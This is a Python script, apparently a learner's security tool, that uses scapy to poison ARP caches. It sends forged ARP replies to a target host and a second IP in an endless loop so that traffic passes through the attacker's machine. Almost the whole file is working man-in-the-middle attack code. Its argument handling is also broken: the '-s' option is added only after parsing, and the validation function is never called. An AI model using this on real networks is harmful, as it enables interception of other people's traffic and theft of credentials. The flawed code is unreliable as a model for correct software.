#!/usr/bin/env python

import scapy.all as scapy
import argparse
import time

def main():
    tar_IP, spoofIP = get_arguments()
    packet1 = create_packet(tar_IP, spoofIP)
    packet2 = create_packet(spoofIP, tar_IP)
    while True:
        scapy.send(packet1)
        scapy.send(packet2)
        time.sleep(2)


def create_packet(tar_IP, spoofIP):
    #gets mac for provided IP first:
    mac = get_mac(tar_IP)

    #Creates a packet to spoof a target that we are the gateway IP
    #pdst=destination IP (of our target)
    #hwdst=destination MAC (of out target)
    #prsc=projected source (what we're telling this target our fake IP is)
        #reassociates MAC address in target's table for this IP to our MAC
    packet = scapy.ARP(op=2, pdst=tar_IP, hwdst=mac, psrc=spoofIP)

    return packet


def get_mac(ip):
    #creates an arp request packet at target ip
    arp_request = scapy.ARP(pdst=ip)
    #creates a broadcast packet to the generic broadcast mac addr
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    #combines the arp and broadcast packets for later use
    arp_request_broadcast = broadcast/arp_request
    #sends arp packet via srp and stores answered and unanswered packet responses
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    return answered_list[0][1].hwsrc


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--targetIP', dest='targetIP', help="IP that user wishes to trick.")
    options = parser.parse_args()
    parser.add_argument('-s', '--spoofIP', dest='spoofIP', help="IP that user wants the target to reassociate the MAC for.")
    options = parser.parse_args()

    return options.targetIP, options.spoofIP


def check_args(targetIP, spoofIP):
    if targetIP == None:
        print('Please input a target to trick using the "-t" command.\n(Use --help for help)')
        exit()
    if spoofIP == None:
        print('Please input an IP you want the target to associate you as using the "-s" command.\n(Use --help for help)')
        exit()


if __name__ == '__main__':
    main()